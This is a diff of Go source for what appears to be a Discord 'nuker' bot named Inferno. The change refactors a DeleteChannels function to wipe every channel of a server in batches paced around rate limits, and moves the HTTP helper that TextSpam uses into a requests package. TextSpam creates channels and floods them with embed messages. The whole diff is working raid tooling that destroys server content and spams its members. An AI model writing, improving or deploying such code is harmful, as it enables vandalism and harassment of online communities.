@@ -1,6 +1,7 @@
-package cogs
+package creating
 
 import (
+	"Inferno/core/requests"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -11,13 +12,18 @@ import (
 	"github.com/joho/godotenv"
 )
 
-func DeleteChannels(s *discordgo.Session, channels []*discordgo.Channel, wg *sync.WaitGroup) {
-	for _, channel := range channels {
-		wg.Add(1)
-		go func(ch *discordgo.Channel) {
-			defer wg.Done()
-			s.ChannelDelete(ch.ID)
-		}(channel)
+func DeleteChannels(s *discordgo.Session, channels []*discordgo.Channel) {
+	smoothed := requests.Smooth(channels)
+	for _, ch := range smoothed {
+		wg := new(sync.WaitGroup)
+		wg.Add(len(ch))
+		for _, channel := range ch {
+			go func(ch *discordgo.Channel) {
+				defer wg.Done()
+				s.ChannelDelete(ch.ID)
+			}(channel)
+		}
+		wg.Wait()
 	}
 }
 
@@ -35,7 +41,7 @@ func TextSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitG
 
 	embed := discordgo.MessageEmbed{
 		Title:       EMBED_TITLE,
-		Description: EMBED_DESCRIPTION + "\n\n" + "**Server invite:** **https://discord.gg/53YekCPSAE**" + "\n" + "\n> **Bot joined at:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n\n",
+		Description: EMBED_DESCRIPTION + "\n" + "\n> **Bot joined at:** " + "`" + fmt.Sprint(event.ID) + "`\n\n",
 		Color:       00255,
 		Thumbnail:   &thumbnail,
 	}
@@ -48,7 +54,7 @@ func TextSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitG
 	dataMap := map[string]string{"name": string(CHANNEL_NAME), "type": "0"}
 	jsonData, _ := json.Marshal(dataMap)
 
-	data := Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/channels", "POST", jsonData)
+	data := requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/channels", "POST", jsonData)
 
 	time.Sleep(2 * time.Second)
 
@@ -69,7 +75,7 @@ func TextSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitG
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/messages", "POST", jsonData)
+			requests.Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/messages", "POST", jsonData)
 		}()
 		time.Sleep(time.Second)
 
